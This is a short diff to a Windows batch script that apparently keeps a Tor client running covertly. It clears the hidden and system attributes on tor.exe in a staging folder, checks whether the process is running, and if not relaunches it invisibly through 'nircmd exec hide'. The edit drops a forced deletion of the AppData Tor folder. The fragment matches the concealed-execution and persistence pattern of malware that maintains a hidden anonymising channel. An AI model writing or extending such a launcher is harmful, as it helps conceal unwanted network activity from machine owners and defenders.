@@ -38,7 +38,7 @@ attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (echo) else (
-rmdir /s /q "%appdata%\tor" && "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
+"%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
